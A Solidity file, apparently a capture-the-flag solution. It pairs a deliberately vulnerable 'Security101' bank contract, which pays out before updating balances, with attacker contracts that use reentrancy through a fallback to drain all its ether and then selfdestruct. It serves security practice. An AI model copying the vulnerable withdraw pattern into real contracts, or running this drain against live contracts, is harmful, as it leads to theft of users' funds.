// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;
import "forge-std/console.sol";

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

// https://ethereum.stackexchange.com/questions/29469/is-addressthis-a-valid-address-in-a-contracts-constructor
// in order to `receive` callback, we have to add a new contract and attack outside constructor
contract AttackerMiddle {
    address constant token = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;
    constructor() payable {
        Security101(token).deposit{value: msg.value}();
    }

    function attack(uint i) public payable {
        Security101(token).withdraw(i);
    }

    fallback() external payable {
        if (msg.value == 0) {
            attack(gasleft());
            attack(address(token).balance);
            selfdestruct(payable(tx.origin));
        } else if (msg.value == address(this).balance) {
            attack(msg.value);
        }
    }
}

// when selfdestruct, nothing would write to code, saving gas.
contract OptimizedAttackerSecurity101 {
    constructor(address token) payable {
        OptimizedAttackerSecurity101(address(new AttackerMiddle{value: 50000}())).attack{gas: 50000}();
        selfdestruct(payable(tx.origin));
    }
    function attack() external {}
}
